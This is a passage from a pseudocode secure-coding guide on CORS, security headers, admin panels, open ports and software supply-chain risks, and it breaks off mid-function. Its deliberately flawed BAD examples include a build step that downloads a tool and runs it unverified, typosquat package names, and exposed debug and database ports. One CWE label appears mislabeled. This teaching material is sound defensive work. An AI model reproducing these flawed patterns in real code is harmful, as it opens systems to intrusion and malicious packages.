END FUNCTION

FUNCTION handle_cors(request, response):
    origin = request.get_header("Origin")

    // Strict allowlist check
    IF origin IN get_allowed_origins():
        response.set_header("Access-Control-Allow-Origin", origin)
        response.set_header("Access-Control-Allow-Credentials", "true")
        response.set_header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE")
        response.set_header("Access-Control-Allow-Headers", "Content-Type, Authorization")
        response.set_header("Access-Control-Max-Age", "86400")  // Cache preflight
    END IF

    // Vary header for proper caching
    response.set_header("Vary", "Origin")

    RETURN response
END FUNCTION

// For APIs that don't need credentials (truly public)
FUNCTION configure_public_api_cors():
    app.use_cors({
        origin: "*",
        credentials: FALSE,  // No cookies, no problem with wildcard
        methods: ["GET"],    // Read-only
        max_age: 86400
    })
END FUNCTION

// Subdomain matching done safely
FUNCTION is_allowed_subdomain(origin):
    TRY:
        parsed = parse_url(origin)
        host = parsed.hostname.lower()

        // Must use HTTPS in production
        IF environment == "production" AND parsed.scheme != "https":
            RETURN FALSE
        END IF

        // Exact match for apex domain
        IF host == "example.com":
            RETURN TRUE
        END IF

        // Subdomain check - must END with .example.com (not just contain)
        IF host.ends_with(".example.com"):
            // Additional: validate it's a known/expected subdomain
            subdomain = host.replace(".example.com", "")
            IF subdomain IN ["www", "app", "api", "admin"]:
                RETURN TRUE
            END IF
        END IF

        RETURN FALSE
    CATCH:
        RETURN FALSE
    END TRY
END FUNCTION
```

### 7.5 Missing Security Headers

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: No security headers configured
// ========================================

FUNCTION send_response(content):
    response = new Response()
    response.body = content
    // No security headers set - browser uses permissive defaults
    RETURN response
END FUNCTION

// Missing headers leave users vulnerable to:
// - Clickjacking (no X-Frame-Options)
// - XSS (no CSP)
// - MIME sniffing attacks (no X-Content-Type-Options)
// - Protocol downgrade (no HSTS)
// - Information leakage (no Referrer-Policy)

// ========================================
// GOOD: Comprehensive security headers
// ========================================

FUNCTION apply_security_headers(response):
    // Prevent clickjacking - page cannot be embedded in frames
    response.set_header("X-Frame-Options", "DENY")
    // Or allow same-origin only: "SAMEORIGIN"

    // Prevent MIME type sniffing
    response.set_header("X-Content-Type-Options", "nosniff")

    // XSS filter (legacy, but still useful for older browsers)
    response.set_header("X-XSS-Protection", "1; mode=block")

    // Control referrer information
    response.set_header("Referrer-Policy", "strict-origin-when-cross-origin")

    // HTTP Strict Transport Security - force HTTPS
    IF environment == "production":
        response.set_header(
            "Strict-Transport-Security",
            "max-age=31536000; includeSubDomains; preload"
        )
    END IF

    // Permissions Policy - disable unnecessary browser features
    response.set_header(
        "Permissions-Policy",
        "geolocation=(), microphone=(), camera=(), payment=()"
    )

    // Content Security Policy
    response.set_header(
        "Content-Security-Policy",
        build_csp_header()
    )

    RETURN response
END FUNCTION

FUNCTION build_csp_header():
    // Start restrictive, loosen as needed
    csp_directives = {
        "default-src": "'self'",
        "script-src": "'self'",           // Add 'nonce-xxx' for inline scripts
        "style-src": "'self'",            // Add 'unsafe-inline' only if necessary
        "img-src": "'self' data: https:",
        "font-src": "'self'",
        "connect-src": "'self'",          // API endpoints
        "frame-ancestors": "'none'",       // Prevents framing (like X-Frame-Options)
        "form-action": "'self'",           // Form submissions
        "base-uri": "'self'",              // Prevent base tag injection
        "object-src": "'none'",            // No Flash/Java plugins
        "upgrade-insecure-requests": ""    // Auto-upgrade HTTP to HTTPS
    }

    // For production, add reporting
    IF environment == "production":
        csp_directives["report-uri"] = "/csp-violation-report"
        csp_directives["report-to"] = "csp-endpoint"
    END IF

    // Build header string
    parts = []
    FOR directive, value IN csp_directives:
        IF value != "":
            parts.append(directive + " " + value)
        ELSE:
            parts.append(directive)
        END IF
    END FOR

    RETURN parts.join("; ")
END FUNCTION

// Apply to all responses via middleware
app.use_middleware(FUNCTION(request, response, next):
    next()
    apply_security_headers(response)
END FUNCTION)

// For APIs, simpler headers may suffice
FUNCTION apply_api_security_headers(response):
    response.set_header("X-Content-Type-Options", "nosniff")
    response.set_header("X-Frame-Options", "DENY")
    response.set_header("Cache-Control", "no-store")  // Don't cache sensitive data

    IF environment == "production":
        response.set_header(
            "Strict-Transport-Security",
            "max-age=31536000; includeSubDomains"
        )
    END IF

    RETURN response
END FUNCTION
```

### 7.6 Exposed Admin Interfaces

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Admin panel accessible without protection
// ========================================

// Mistake 1: Admin on predictable paths with no extra protection
app.route("/admin", admin_dashboard)
app.route("/admin/users", manage_users)
app.route("/wp-admin", wordpress_admin)     // Default paths are scanned
app.route("/phpmyadmin", database_admin)

// Mistake 2: Admin shares same authentication as user area
FUNCTION admin_dashboard(request):
    user = get_logged_in_user(request)

    IF user AND user.is_admin:
        RETURN render_admin_dashboard()
    END IF

    RETURN redirect("/login")
END FUNCTION

// Mistake 3: Admin interface exposed to internet
// No IP restrictions, no additional authentication factors

// ========================================
// GOOD: Defense in depth for admin interfaces
// ========================================

// Layer 1: Non-predictable path (security through obscurity as one layer, not the only layer)
CONSTANT ADMIN_PATH = get_environment_variable("ADMIN_PATH", "/manage-" + random_string(8))

// Layer 2: IP allowlist for admin access
CONSTANT ADMIN_IP_ALLOWLIST = [
    "10.0.0.0/8",       // Internal network
    "192.168.1.0/24",   // Office network
    // Or use VPN: require VPN connection to access admin
]

FUNCTION admin_ip_check_middleware(request, next):
    client_ip = get_client_ip(request)

    IF NOT ip_in_ranges(client_ip, ADMIN_IP_ALLOWLIST):
        log.warning("Admin access attempt from unauthorized IP", {
            ip: client_ip,
            path: request.path
        })
        RETURN forbidden_response("Access denied")
    END IF

    RETURN next()
END FUNCTION

// Layer 3: Require re-authentication for admin
FUNCTION admin_auth_middleware(request, next):
    user = get_logged_in_user(request)

    IF NOT user OR NOT user.is_admin:
        RETURN redirect("/login")
    END IF

    // Require recent authentication for admin actions
    session = get_session(request)
    IF current_time() - session.last_auth_time > 900:  // 15 minutes
        RETURN redirect("/admin/reauthenticate?next=" + request.path)
    END IF

    // Require MFA for admin access
    IF NOT session.mfa_verified:
        RETURN redirect("/admin/mfa-verify?next=" + request.path)
    END IF

    RETURN next()
END FUNCTION

// Layer 4: Additional security headers for admin
FUNCTION admin_security_headers(response):
    // More restrictive CSP for admin
    response.set_header("Content-Security-Policy",
        "default-src 'self'; script-src 'self'; frame-ancestors 'none'")

    // Prevent caching of admin pages
    response.set_header("Cache-Control", "no-store, no-cache, must-revalidate")
    response.set_header("Pragma", "no-cache")

    RETURN response
END FUNCTION

// Layer 5: Comprehensive audit logging
FUNCTION admin_audit_middleware(request, next):
    response = next()

    log.audit("admin_action", {
        user_id: request.user.id,
        username: request.user.username,
        action: request.method + " " + request.path,
        ip: get_client_ip(request),
        user_agent: request.get_header("User-Agent"),
        timestamp: current_timestamp(),
        status: response.status_code
    })

    RETURN response
END FUNCTION

// Register admin routes with all middleware
app.group(ADMIN_PATH, [
    admin_ip_check_middleware,
    admin_auth_middleware,
    admin_audit_middleware
], FUNCTION():
    app.route("/", admin_dashboard)
    app.route("/users", manage_users)
    app.route("/settings", admin_settings)
END FUNCTION)

// Consider separate admin application entirely
// Run admin on different port, internal network only
// admin-internal.example.com (not accessible from internet)
```

### 7.7 Unnecessary Open Ports and Services

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Unnecessary services and ports exposed
// ========================================

// Mistake 1: Debug/development ports left open in production
app.listen(3000)                    // Main app
debug_server.listen(9229)           // Node.js debugger - remote code execution!
profiler.listen(8888)               // Profiler endpoint
metrics_internal.listen(9090)       // Prometheus metrics with sensitive data

// Mistake 2: Database ports exposed to network
// MongoDB on 27017, MySQL on 3306, PostgreSQL on 5432
// Without authentication or bound to 0.0.0.0

// Mistake 3: Management interfaces on public ports
redis.config.bind = "0.0.0.0"       // Redis exposed to network
elasticsearch_http = TRUE            // ES HTTP API exposed

// Mistake 4: All services in one container/server without isolation

// ========================================
// GOOD: Minimal attack surface
// ========================================

// Principle: Only expose what's necessary for the service to function

FUNCTION configure_server():
    // Main application - public facing
    app.listen({
        port: 443,
        host: "0.0.0.0"  // Must be accessible
    })

    // Health check - internal only
    health_server.listen({
        port: 8080,
        host: "127.0.0.1"  // Only accessible from localhost/internal
    })

    // Metrics - internal only, with authentication
    metrics_server.listen({
        port: 9090,
        host: "127.0.0.1",
        middleware: [basic_auth_middleware]
    })

    // NEVER start debug servers in production
    IF environment == "production":
        // Debug features should not exist in production code
        // Or be explicitly disabled
        disable_debug_endpoints()
    END IF
END FUNCTION

// Database configuration - never expose to network
FUNCTION configure_database():
    // Option 1: Unix socket (local only)
    database.connect({
        socket: "/var/run/postgresql/.s.PGSQL.5432"
    })

    // Option 2: Localhost binding
    database.connect({
        host: "127.0.0.1",
        port: 5432
    })

    // Option 3: Private network with firewall rules
    database.connect({
        host: "10.0.1.50",  // Internal IP, firewalled from internet
        port: 5432,
        ssl: TRUE
    })
END FUNCTION

// Container/service isolation
// Dockerfile example (pseudocode):
// EXPOSE 443           # Only expose necessary port
// USER nonroot         # Don't run as root
// Don't include: debuggers, profilers, shells, package managers

FUNCTION verify_minimal_ports():
    // Startup check - fail if unexpected ports are listening

    expected_ports = {
        443: "application",
        8080: "health_check"
    }

    listening_ports = get_listening_ports()

    FOR port IN listening_ports:
        IF port NOT IN expected_ports:
            log.error("Unexpected port listening", {port: port})

            IF environment == "production":
                THROW SecurityError("Unexpected port " + port + " listening")
            END IF
        END IF
    END FOR
END FUNCTION

// Firewall configuration (pseudocode for iptables/security groups)
firewall_rules = {
    inbound: [
        {port: 443, source: "0.0.0.0/0", description: "HTTPS"},
        {port: 80, source: "0.0.0.0/0", description: "HTTP (redirect to HTTPS)"},
        {port: 22, source: "10.0.0.0/8", description: "SSH from internal only"}
    ],
    outbound: [
        {port: 443, dest: "0.0.0.0/0", description: "HTTPS APIs"},
        {port: 53, dest: "10.0.0.1", description: "DNS to internal resolver"}
    ],
    default: "deny"
}

// Service mesh / network policies for Kubernetes
network_policy = {
    ingress: [
        {from: "ingress-controller", ports: [8080]}
    ],
    egress: [
        {to: "database", ports: [5432]},
        {to: "cache", ports: [6379]}
    ]
}
```

---

## 8. Dependency and Supply Chain Security

**CWE References:** CWE-1357 (Hallucinated/Malicious Packages), CWE-1104 (Use of Unmaintained Third-Party Components), CWE-829 (Inclusion of Functionality from Untrusted Control Sphere), CWE-494 (Download of Code Without Integrity Check)
**Severity:** Critical | **Related:** [[Dependency-Risks]]

> **Risk:** Supply chain attacks have become a leading vector for compromises. AI-generated code is particularly vulnerable: studies show 5-21% of AI-suggested packages don't exist (slopsquatting), creating opportunities for attackers to register malicious packages. Even legitimate dependencies can introduce vulnerabilities through outdated versions, typosquatting attacks, or compromised transitive dependencies.

### 8.1 Using Outdated Packages with Known Vulnerabilities

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: No vulnerability scanning or version management
// ========================================

// package.json / requirements.txt / Cargo.toml (no version checking)
dependencies = {
    "lodash": "^4.17.0",       // Has known prototype pollution CVE-2019-10744
    "express": "3.x",          // EOL version with multiple CVEs
    "serialize-javascript": "1.9.0",  // XSS vulnerability
    "minimist": "0.0.8"        // Prototype pollution vulnerability
}

FUNCTION install_dependencies():
    // Vulnerable: No security audit before or after install
    package_manager.install()
    // Dependencies installed, but vulnerabilities unknown
END FUNCTION

FUNCTION run_build():
    // Vulnerable: CI/CD pipeline doesn't check for vulnerabilities
    install_dependencies()
    compile_code()
    deploy()  // Deploying known vulnerable code
END FUNCTION

// ========================================
// GOOD: Active vulnerability management
// ========================================

// Step 1: Use dependency scanning in development
FUNCTION install_dependencies():
    // Install dependencies
    package_manager.install()

    // Run vulnerability audit
    audit_result = package_manager.audit()

    IF audit_result.has_critical OR audit_result.has_high:
        log.error("Security vulnerabilities found", audit_result)
        THROW Error("Cannot install packages with known vulnerabilities")
    END IF

    IF audit_result.has_moderate:
        log.warn("Moderate vulnerabilities found - review required")
    END IF
END FUNCTION

// Step 2: CI/CD pipeline integration
FUNCTION ci_security_checks():
    // Run multiple scanners for defense in depth

    // Package manager native audit
    audit_npm = run_command("npm audit --audit-level=high")

    // Dedicated vulnerability scanner (Snyk, Dependabot, etc.)
    scan_result = security_scanner.scan({
        fail_on: ["critical", "high"],
        ignore_dev_dependencies: FALSE,  // Dev deps can still be exploited
        scan_transitive: TRUE
    })

    IF NOT scan_result.passed:
        // Block deployment
        send_alert("Security scan failed", scan_result.vulnerabilities)
        THROW PipelineError("Security checks failed")
    END IF
END FUNCTION

// Step 3: Automated updates with testing
FUNCTION schedule_dependency_updates():
    // Automated PR creation for security patches
    configure_dependabot({
        update_schedule: "weekly",
        security_updates: "immediate",  // High/critical get PRs immediately
        ignore: [],  // Don't ignore security updates
        auto_merge: {
            enabled: TRUE,
            conditions: ["tests_pass", "security_patch_only"]
        }
    })
END FUNCTION

// Step 4: Monitor for new vulnerabilities
FUNCTION monitor_dependencies():
    // Subscribe to security advisories
    advisories.subscribe({
        packages: get_production_dependencies(),
        severity: ["critical", "high", "moderate"],
        callback: FUNCTION(advisory):
            create_urgent_ticket(advisory)

            IF advisory.severity == "critical":
                send_pager_alert(advisory)
            END IF
        END FUNCTION
    })
END FUNCTION
```

### 8.2 Not Pinning Dependency Versions

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Loose version constraints
// ========================================

// package.json with ranges that allow breaking/malicious updates
{
    "dependencies": {
        "express": "*",           // ANY version - extremely dangerous
        "lodash": "latest",       // Always latest - no reproducibility
        "react": "^18.0.0",       // Major.minor.patch - allows minor bumps
        "axios": "~1.2.0",        // Allows patch updates automatically
        "moment": ""              // No version specified
    }
}

// Python requirements.txt
express            # No version - gets latest
lodash>=4.0.0      # Minimum only - accepts any newer version
react              # Latest

// Problems:
// 1. Builds not reproducible - different installs get different versions
// 2. Malicious version published = auto-installed on next build
// 3. Breaking changes silently introduced
// 4. "Works on my machine" issues

FUNCTION deploy():
    // Different developers/builds get different dependency versions
    install_dependencies()  // Non-deterministic
    run_tests()             // May pass with one version, fail with another
    deploy_to_production()  // Production behavior unpredictable
END FUNCTION

// ========================================
// GOOD: Exact version pinning with lockfiles
// ========================================

// package.json with exact versions
{
    "dependencies": {
        "express": "4.18.2",      // Exact version
        "lodash": "4.17.21",      // Exact version
        "react": "18.2.0",        // Exact version
        "axios": "1.6.2",         // Exact version
        "moment": "2.29.4"        // Exact version
    }
}

// Python requirements.txt with exact pins
express==4.18.2
lodash==4.17.21
react==18.2.0

// Step 1: Always use lockfiles
FUNCTION setup_project():
    // Generate and commit lockfile
    package_manager.install()

    // Commit the lockfile to version control
    // package-lock.json, yarn.lock, Pipfile.lock, poetry.lock, Cargo.lock
    git.add("package-lock.json")
    git.commit("Lock dependency versions for reproducible builds")
END FUNCTION

// Step 2: Use lockfile for installs
FUNCTION install_dependencies():
    // Use frozen/locked install (no modifications to lockfile)
    // npm ci, pip install --no-deps, poetry install --no-update
    package_manager.install_from_lockfile()

    // Verify lockfile matches package file
    IF lockfile_outdated():
        THROW Error("Lockfile out of sync - run package_manager.install locally")
    END IF
END FUNCTION

// Step 3: CI verification
FUNCTION ci_verify_lockfile():
    // Ensure lockfile is present and used
    IF NOT file_exists("package-lock.json"):
        THROW Error("Lockfile missing - add to version control")
    END IF

    // Install with strict lockfile adherence
    result = run_command("npm ci")  // Fails if lockfile doesn't match

    IF NOT result.success:
        THROW Error("Lockfile integrity check failed")
    END IF
END FUNCTION

// Step 4: Controlled updates
FUNCTION update_dependency(package_name, new_version):
    // Update one dependency at a time with review
    package_manager.update(package_name, new_version)

    // Run full test suite
    run_all_tests()

    // Check for vulnerabilities in new version
    security_scan()

    // Create PR for review
    create_pull_request({
        title: "Update " + package_name + " to " + new_version,
        body: generate_changelog_diff(package_name),
        reviewers: ["security-team"]
    })
END FUNCTION
```

### 8.3 Typosquatting and Slopsquatting Risks

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Accepting AI package suggestions without verification
// ========================================

// AI suggests: "Use the 'coloUrs' package for terminal colors"
// Developer copies without checking:

IMPORT colours from "colours"        // Typosquat of "colors"
IMPORT lodashs from "lodashs"        // Typosquat of "lodash"
IMPORT requets from "requets"        // Typosquat of "requests"
IMPORT electorn from "electorn"      // Typosquat of "electron"
IMPORT cripto from "cripto"          // Typosquat of "crypto"

// Slopsquatting: AI hallucinated package that doesn't exist
// Attacker registers it with malicious code
IMPORT ai-json-parser from "ai-json-parser"  // Never existed - attacker registered

FUNCTION install_package(name):
    // Dangerous: No verification that package is legitimate
    package_manager.install(name)
END FUNCTION

// Attack vector:
// 1. AI hallucinates package name "react-utils-helper"
// 2. Package doesn't exist on npm
// 3. Attacker monitors AI suggestions, registers "react-utils-helper"
// 4. Malicious code runs in thousands of projects

// ========================================
// GOOD: Verify packages before installation
// ========================================

FUNCTION verify_package(package_name):
    // Step 1: Check if package exists in official registry
    package_info = registry.lookup(package_name)

    IF package_info IS NULL:
        log.error("Package does not exist", {name: package_name})
        RETURN {valid: FALSE, reason: "Package not found in registry"}
    END IF

    // Step 2: Check package age and download stats
    IF package_info.created_date > (now() - 30_DAYS):
        log.warn("Recently created package - review carefully", {
            name: package_name,
            created: package_info.created_date
        })
    END IF

    IF package_info.weekly_downloads < 1000:
        log.warn("Low download count - verify legitimacy", {
            name: package_name,
            downloads: package_info.weekly_downloads
        })
    END IF

    // Step 3: Check for typosquatting indicators
    similar_packages = find_similar_names(package_name)
    FOR similar IN similar_packages:
        IF similar.downloads > package_info.downloads * 100:
            log.warn("Possible typosquat of popular package", {
                requested: package_name,
                popular_similar: similar.name
            })
            RETURN {valid: FALSE, reason: "Possible typosquat of " + similar.name}
        END IF
    END FOR

    // Step 4: Check publisher reputation
    IF NOT package_info.publisher.verified:
        log.warn("Unverified publisher", {publisher: package_info.publisher.name})
    END IF

    // Step 5: Check for known malicious indicators
    IF security_database.is_malicious(package_name):
        log.error("Known malicious package", {name: package_name})
        RETURN {valid: FALSE, reason: "Package flagged as malicious"}
    END IF

    RETURN {valid: TRUE, info: package_info}
END FUNCTION

FUNCTION install_package_safely(name):
    verification = verify_package(name)

    IF NOT verification.valid:
        THROW Error("Package verification failed: " + verification.reason)
    END IF

    // Only install after verification
    package_manager.install(name)
END FUNCTION

// Use allowlist for approved packages
FUNCTION enforce_package_allowlist():
    approved_packages = load_allowlist("approved-packages.txt")

    current_dependencies = get_all_dependencies()

    FOR dep IN current_dependencies:
        IF dep NOT IN approved_packages:
            log.error("Unapproved dependency", {package: dep})
            THROW SecurityError("Package not in allowlist: " + dep)
        END IF
    END FOR
END FUNCTION

// Common typosquatting patterns to check
FUNCTION get_typosquat_variants(name):
    variants = []

    // Character substitution
    variants.add(name.replace("l", "1"))   // lodash -> 1odash
    variants.add(name.replace("o", "0"))   // colors -> c0lors

    // Double characters
    FOR i IN range(len(name)):
        variants.add(name[:i] + name[i] + name[i:])  // lodash -> llodash

    // Missing characters
    FOR i IN range(len(name)):
        variants.add(name[:i] + name[i+1:])  // lodash -> ldash

    // Transposed characters
    FOR i IN range(len(name)-1):
        variants.add(name[:i] + name[i+1] + name[i] + name[i+2:])

    RETURN variants
END FUNCTION
```

### 8.4 Including Unnecessary Dependencies

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Kitchen-sink dependencies
// ========================================

// Adding large libraries for simple tasks
IMPORT moment from "moment"          // 300KB for date formatting
IMPORT lodash from "lodash"          // Entire library for one function
IMPORT jquery from "jquery"          // Just for simple DOM selection
IMPORT bootstrap from "bootstrap"    // Just for one CSS class
IMPORT aws_sdk from "aws-sdk"        // Entire SDK for one service

FUNCTION format_date(date):
    // Using 300KB library for simple formatting
    RETURN moment(date).format("YYYY-MM-DD")
END FUNCTION

FUNCTION capitalize_string(str):
    // Using lodash just for capitalize
    RETURN lodash.capitalize(str)
END FUNCTION

// Problems:
// 1. Larger attack surface - more code = more potential vulnerabilities
// 2. Each dependency is a supply chain risk
// 3. Transitive dependencies multiply the risk
// 4. Bloated bundle size affects performance
// 5. More packages to audit and update

// ========================================
// GOOD: Minimal, targeted dependencies
// ========================================

// Option 1: Use native language features
FUNCTION format_date(date):
    // Native Intl.DateTimeFormat (no dependency)
    formatter = Intl.DateTimeFormat("en-CA", {
        year: "numeric",
        month: "2-digit",
        day: "2-digit"
    })
    RETURN formatter.format(date)
END FUNCTION

FUNCTION capitalize_string(str):
    // Native string methods (no dependency)
    IF str.length == 0:
        RETURN str
    END IF
    RETURN str[0].toUpperCase() + str.slice(1).toLowerCase()
END FUNCTION

// Option 2: Use focused micro-packages when needed
IMPORT date_fns_format from "date-fns/format"  // Just the format function
IMPORT capitalize from "lodash/capitalize"      // Just capitalize, not all of lodash

// Option 3: Import only what you need from modular packages
IMPORT { S3Client } from "@aws-sdk/client-s3"  // Just S3, not entire AWS SDK

// Dependency audit function
FUNCTION audit_dependencies():
    dependencies = get_all_dependencies()
    issues = []

    FOR dep IN dependencies:
        // Check for large packages that could be replaced
        IF dep.size > SIZE_THRESHOLD:
            // Analyze actual usage
            used_exports = analyze_imports(dep.name)
            total_exports = get_package_exports(dep.name)

            usage_ratio = used_exports.count / total_exports.count

            IF usage_ratio < 0.1:  // Using less than 10% of package
                issues.append({
                    package: dep.name,
                    size: dep.size,
                    usage: usage_ratio,
                    recommendation: "Consider focused alternative or native implementation"
                })
            END IF
        END IF

        // Check for deprecated packages
        IF dep.deprecated:
            issues.append({
                package: dep.name,
                reason: "deprecated",
                alternative: dep.recommended_alternative
            })
        END IF

        // Check for packages with many vulnerabilities historically
        vuln_history = get_vulnerability_history(dep.name)
        IF vuln_history.count > 5:
            issues.append({
                package: dep.name,
                reason: "frequent_vulnerabilities",
                count: vuln_history.count
            })
        END IF
    END FOR

    RETURN issues
END FUNCTION

// Enforce maximum dependency count/size
FUNCTION enforce_dependency_limits():
    deps = get_production_dependencies()

    IF deps.count > MAX_DIRECT_DEPS:
        log.warn("Too many direct dependencies", {
            count: deps.count,
            max: MAX_DIRECT_DEPS
        })
    END IF

    total_deps = get_all_dependencies_including_transitive()

    IF total_deps.count > MAX_TOTAL_DEPS:
        log.error("Excessive transitive dependencies", {
            count: total_deps.count,
            max: MAX_TOTAL_DEPS
        })
    END IF
END FUNCTION
```

### 8.5 Missing Integrity Checks

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: No integrity verification
// ========================================

// HTML script tag without integrity
<script src="https://cdn.example.com/library.js"></script>

// Downloading without verification
FUNCTION download_dependency(url):
    content = http.get(url)
    write_file("lib/dependency.js", content)
    // No verification that content is what we expected
END FUNCTION

// Package install without lockfile integrity
FUNCTION install():
    run_command("npm install")  // Uses ^ ranges, no integrity check
END FUNCTION

// Build process pulling from remote without checks
FUNCTION build():
    // Downloading build tools without verification
    download("https://build-tools.example.com/compiler.tar.gz")
    extract("compiler.tar.gz")
    execute("./compiler/build")  // Running unverified code
END FUNCTION

// ========================================
// GOOD: Verify integrity at every step
// ========================================

// HTML with Subresource Integrity (SRI)
<script
    src="https://cdn.example.com/library.js"
    integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
    crossorigin="anonymous">
</script>

// Download with hash verification
FUNCTION download_verified(url, expected_hash):
    content = http.get(url)

    // Calculate hash of downloaded content
    actual_hash = crypto.sha384(content)

    IF actual_hash != expected_hash:
        log.error("Integrity check failed", {
            url: url,
            expected: expected_hash,
            actual: actual_hash
        })
        THROW SecurityError("Downloaded file failed integrity check")
    END IF

    RETURN content
END FUNCTION

FUNCTION download_dependency(url, expected_hash):
    content = download_verified(url, expected_hash)
    write_file("lib/dependency.js", content)
    log.info("Dependency installed with verified integrity", {url: url})
END FUNCTION

// Package lockfile with integrity hashes
// package-lock.json includes:
{
    "lodash": {
        "version": "4.17.21",
        "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
        "integrity": "sha512-v2kDE0cyTsc..."  // Verified on install
    }
}

// Strict install from lockfile
FUNCTION install_with_integrity():
    // npm ci verifies integrity hashes from lockfile
    result = run_command("npm ci")

    IF NOT result.success:
        THROW Error("Installation failed integrity verification")
    END IF
END FUNCTION

// Build reproducibility with verified tools
FUNCTION secure_build():
    // Pin and verify all build tool versions
    tools = {
        "node": {version: "20.10.0", hash: "sha256:abc123..."},
        "npm": {version: "10.2.3", hash: "sha256:def456..."},
        "compiler": {version: "1.2.3", hash: "sha256:ghi789..."}
    }

    FOR tool_name, tool_spec IN tools:
        // Verify tool binary integrity before use
        actual_hash = hash_file(get_tool_path(tool_name))

        IF actual_hash != tool_spec.hash:
            THROW SecurityError("Build tool integrity check failed: " + tool_name)
        END IF
    END FOR

    // Proceed with verified tools
    run_build()
END FUNCTION

// Generate SRI hashes for your own assets
FUNCTION generate_sri_hash(file_path):
    content = read_file(file_path)
    hash = crypto.sha384_base64(content)
    RETURN "sha384-" + hash
END FUNCTION

FUNCTION generate_script_tag(src, file_path):
    integrity = generate_sri_hash(file_path)
    RETURN '<script src="' + src + '" integrity="' + integrity + '" crossorigin="anonymous"></script>'
END FUNCTION

// Registry verification
FUNCTION verify_registry():
    // Ensure using official, signed registry
    registry_config = get_registry_config()

    IF NOT registry_config.url.startswith("https://"):
        THROW SecurityError("Registry must use HTTPS")
    END IF

    // Verify registry certificate
    IF NOT verify_certificate(registry_config.url):
        THROW SecurityError("Registry certificate verification failed")
    END IF

    // Check for registry signing if supported
    IF registry_supports_signing(registry_config.url):
        enable_signature_verification()
    END IF
END FUNCTION
```

### 8.6 Trusting Transitive Dependencies Blindly

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Ignoring transitive dependency risks
// ========================================

// Your package.json has 10 direct dependencies
// But those bring in 500+ transitive dependencies
// Each is a potential attack vector

FUNCTION show_dependency_problem():
    // You audit only direct dependencies
    direct_deps = ["express", "lodash", "axios"]  // 3 packages

    // Reality after npm install
    all_deps = get_all_installed_packages()
    print("Direct: 3, Total installed: " + all_deps.count)  // 547 packages!

    // Any of those 544 transitive deps could be:
    // - Abandoned and vulnerable
    // - Taken over by malicious actors
    // - Typosquats
    // - Compromised in CI/CD
END FUNCTION

// Event-stream incident: Dependency of dependency was compromised
// ua-parser-js incident: Popular package itself was compromised
// node-ipc incident: Maintainer added malicious code

// ========================================
// GOOD: Full dependency tree visibility and control
// ========================================

// Step 1: Analyze full dependency tree
FUNCTION analyze_dependency_tree():
    tree = package_manager.get_dependency_tree()

    analysis = {
        direct: [],
        transitive: [],
        depth_stats: {},
        risk_assessment: []
    }

    FOR dep IN tree.flatten():
        IF dep.depth == 1:
            analysis.direct.append(dep)
        ELSE:
            analysis.transitive.append(dep)
        END IF

        // Track dependency depth
        analysis.depth_stats[dep.depth] =
            (analysis.depth_stats[dep.depth] OR 0) + 1

        // Risk factors for transitive deps
        risk_score = calculate_risk(dep)
        IF risk_score > THRESHOLD:
            analysis.risk_assessment.append({
                package: dep.name,
                introduced_by: dep.parent_chain,
                risk_score: risk_score,
                factors: get_risk_factors(dep)
            })
        END IF
    END FOR

    RETURN analysis
END FUNCTION

FUNCTION calculate_risk(dep):
    risk = 0

    // Maintainer factors
    IF dep.maintainers.count == 1:
        risk += 10  // Single maintainer - bus factor
    END IF

    IF dep.last_update > 2_YEARS_AGO:
        risk += 20  // Abandoned package
    END IF

    // Security factors
    IF dep.vulnerability_count > 0:
        risk += dep.vulnerability_count * 15
    END IF

    IF dep.has_install_scripts:
        risk += 25  // Runs code on install
    END IF

    // Popularity/trust factors
    IF dep.weekly_downloads < 1000:
        risk += 10  // Low usage
    END IF

    IF NOT dep.has_types AND dep.is_js:
        risk += 5  // Less maintained indicator
    END IF

    RETURN risk
END FUNCTION

// Step 2: Detect and alert on risky transitive deps
FUNCTION monitor_transitive_deps():
    tree = get_dependency_tree()

    FOR dep IN tree.flatten():
        // Check for suspicious characteristics
        IF dep.has_install_scripts:
            log.warn("Package has install scripts", {
                package: dep.name,
                path: dep.parent_chain
            })
            // Review install scripts for malicious code
            scripts = get_install_scripts(dep)
            FOR script IN scripts:
                IF contains_suspicious_patterns(script):
                    THROW SecurityError("Suspicious install script in: " + dep.name)
                END IF
            END FOR
        END IF

        // Check for native code compilation
        IF dep.has_native_code:
            log.warn("Package compiles native code", {
                package: dep.name
            })
        END IF

        // Check for network access
        IF dep.makes_network_requests:
            log.warn("Package makes network requests", {
                package: dep.name
            })
        END IF
    END FOR
END FUNCTION

// Step 3: Use dependency scanning that covers transitives
FUNCTION full_dependency_scan():
    // Scan all dependencies, not just direct
    scan_result = security_scanner.scan({
        include_transitive: TRUE,
        include_dev_dependencies: TRUE,
        scan_depth: "all"  // Not just top-level
    })

    FOR vuln IN scan_result.vulnerabilities:
        // Show the path that introduces the vulnerability
        log.error("Vulnerability found", {
            package: vuln.package,
            version: vuln.version,
            severity: vuln.severity,
            introduced_through: vuln.dependency_path,  // e.g., "express > body-parser > qs"
            recommendation: vuln.recommendation
        })
    END FOR

    RETURN scan_result
END FUNCTION

// Step 4: Consider dependency vendoring for critical deps
FUNCTION vendor_critical_dependency(package_name):
    // Download specific version
    content = download_verified(
        get_package_url(package_name),
        get_expected_hash(package_name)
    )

    // Store in vendor directory (committed to repo)
    write_file("vendor/" + package_name, content)

    // Point imports to vendored version
    configure_import_alias(package_name, "./vendor/" + package_name)

    // Vendored code is:
    // - Not automatically updated (reduces surprise changes)
    // - Under your source control (auditable)
    // - Not subject to registry compromise
END FUNCTION

// Step 5: Use SBOM (Software Bill of Materials)
FUNCTION generate_sbom():
    sbom = {
        format: "CycloneDX",  // or SPDX
        components: [],
        dependencies: []
    }

    FOR dep IN get_all_dependencies():
        sbom.components.append({
            type: "library",
            name: dep.name,
            version: dep.version,
            purl: "pkg:npm/" + dep.name + "@" + dep.version,
            hashes: [
